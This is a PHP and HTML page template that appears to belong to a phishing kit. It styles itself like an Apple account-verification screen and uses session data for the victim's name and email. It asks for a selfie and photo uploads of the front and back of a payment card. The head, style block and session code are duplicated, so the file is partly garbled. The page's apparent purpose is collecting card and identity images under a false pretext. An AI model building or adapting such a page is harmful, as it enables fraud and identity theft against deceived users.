<?php
session_start();
$fnames = $_SESSION['firstname'];
$lnames = $_SESSION['lastname'];
?>
<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
echo "<title>$title_bill</title>";
?>
<style>

.error{
  background-color: #fefdd2;
  
}

.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.required:focus{
    outline: none;
    border-width: 0px;
       -moz-box-shadow: 0px 0px 0px 2px #97CDF5;
    -webkit-box-shadow: 0px 0px 0px 2px #97CDF5;
            box-shadow: 0px 0px 0px 2px #97CDF5;
}

.inox{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.inox:focus{
    border-width: 1px;
    border-color: #0088cc;
    -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

#bottom_m_login{
  background-color: #000;
  position: absolute;
  opacity: 0.7;
  width: 100%;
  height: 50px;
  z-index: 55;
}

#bottom_m1_login{
  background-color: #fff;
  width: 100%;
  margin-top:50px;
  height: 120px;
  z-index: 55;
}
#i1{
  background-image: url(../assets/img/i1.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 12px;
  left: 20px;
  top: 20px;
  z-index: 999;
  position: absolute;
}
#i2{
  background-image: url(../assets/img/i2.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 29px;
  left: 50%;
  margin-left: -17.5px;
  top: 10px;
  z-index: 999;
  position: absolute;
}
#i3{
  background-image: url(../assets/img/i3.png);
  background-repeat: no-repeat;
  width: 20px;
  height: 26px;
  right: 20px;
  top: 10px;
  z-index: 999;
  position: absolute;
}


#container_m_login{
    position: absolute;
    top: 0px;
    left: 50%;
  width: 330px;
  margin-left: -165px;
}
#xheader_m_login{
    width: 100%;
    height: 400px;
    top:0px;
}

.error{
  background-color: #fefdd2;
}
#sub_navbar_m_login{
    width: 100%;
    height: 61px;
    top: 44px;
    left: 0px;
    z-index: 3;
    position: absolute;
}



</style>
<?php
session_start();
$fnames = $_SESSION['firstname'];
$lnames = $_SESSION['lastname'];
?>
<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
echo "<title>$title</title>";
?>
<style>

.error{
  background-color: #fefdd2;
  
}

.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.required:focus{
    border-width: 1px;
    border-color: #0088cc;
       -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

.inox{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.inox:focus{
    border-width: 1px;
    border-color: #0088cc;
    -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

#bottom_m_login{
  background-color: #000;
  position: absolute;
  opacity: 0.7;
  width: 100%;
  height: 50px;
  z-index: 55;
}

#bottom_m1_login{
  background-color: #fff;
  width: 100%;
  margin-top:50px;
  height: 120px;
  z-index: 55;
}
#i1{
  background-image: url(../assets/img/i1.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 12px;
  left: 20px;
  top: 20px;
  z-index: 999;
  position: absolute;
}
#i2{
  background-image: url(../assets/img/i2.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 29px;
  left: 50%;
  margin-left: -17.5px;
  top: 10px;
  z-index: 999;
  position: absolute;
}
#i3{
  background-image: url(../assets/img/i3.png);
  background-repeat: no-repeat;
  width: 20px;
  height: 26px;
  right: 20px;
  top: 10px;
  z-index: 999;
  position: absolute;
}


#container_m_login{
    position: absolute;
    top: 0px;
    left: 50%;
  width: 330px;
  margin-left: -165px;
}
#xheader_m_login{
    width: 100%;
    height: 400px;
    top:0px;
}

.error{
  background-color: #fefdd2;
}
#sub_navbar_m_login{
    width: 100%;
    height: 61px;
    top: 44px;
    left: 0px;
    z-index: 3;
    position: absolute;
}
.button-save {
    font-size: 15px;
    line-height: 1.47059;
    font-weight: 400;
    letter-spacing: -.022em;
    font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
    background-color: #0070c9;
    background: linear-gradient(#42a1ec,#0070c9);
    border: 1px solid #07c;
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    display: inline-block;
    min-width: 30px;
    padding: 4px 15px;
    text-align: center;
    white-space: nowrap;
}

.button-save.disabled, .button-save:disabled {
    background-color: #0070c9;
    background: linear-gradient(#42a1ec,#0070c9);
    border-color: #07c;
    color: #fff;
    cursor: default;
    opacity: .3;
}



</style>

<script>
        function readURLmobile(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();

            reader.onload = function (e) {
                $('#gambarmobile')
                    .attr('src', e.target.result)
                    .width(310)
                    .height(130);
            };

            reader.readAsDataURL(input.files[0]);
        }
    }
    </script>
    </head>
<body>
<div id="bottom_m_login"></div>
    <div id="i1"></div>
    <div id="i2"></div>
    <div id="i3"></div>
    <div id="head" style="height:130px;"><br><div style="font-size: 28px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;">

         <?php if(!empty($fnames)){ 
            echo "<b><center>$account_verif</center><br><font style='text-align:center;padding:5px;position:absolute;top:70px;width:370px;' size='2px'>$account_id ".$_SESSION['email']."</font></b>";
         }else{
            echo "<b><center>$account_verif</center><br><font style='text-align:center;padding:5px;position:absolute;top:70px;width:370px;' size='2px'>$account_id ".$_SESSION['email']."</font></b>";
            }
            ?> 
            </div>
       </div>
    <div id="bottom_m1_login"></div>
<div style="
    margin: auto;
    
    position: relative;
    margin-top: 9px;
    margin-left: 15px;
    height: 530px;
  ">
<form action="" method="POST" enctype="multipart/form-data" >
            <hr style="top:387px;">
                        <br><br>
            <font class="xFont2" style="top:10px;left:20px;"><b><?php echo $selfie;?></b></font>
      <font class="xFont3" style="top:40px;left:20px;">
            <div class="image-upload">
            <img id="gambarmobile" width="310" height="150" src="../assets/img/id.png">
            <br><br>
            <font class="xFont2"><b><?php echo $frontcc;?></b></font><br><br>
            <input id="file-input2" name="file" type="file" required>
            <br><br>
            <font class="xFont2"><b><?php echo $backcc;?></b></font><br><br>
            <input id="file-input2" name="file2" type="file" required>
            </font>
            </div>

            </font>
      <font class="xFont3" style="top:110px;left:600px;"></font>
                        <br><br>

<button class="button-save" type="submit" style="
    position: absolute;
    top: 430px;
    float:right;right:40px;width: 120px;">
<span><?php echo $save;?></span>
</button>


        </form>
        </div>